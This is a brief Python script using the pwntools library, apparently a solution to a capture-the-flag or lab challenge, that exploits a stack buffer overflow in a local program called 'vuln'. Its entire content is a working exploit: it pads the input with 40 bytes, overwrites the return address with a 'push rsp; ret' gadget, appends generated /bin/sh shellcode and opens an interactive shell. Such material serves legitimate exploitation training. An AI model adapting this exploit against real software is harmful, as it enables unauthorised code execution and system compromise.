from pwn import *

push_rsp_ret = 0x000000000041feeb
context.arch = 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.sh()) 

p = process("./vuln")

p.send(b"A" * 40 + p64(push_rsp_ret) + shellcode)

p.interactive()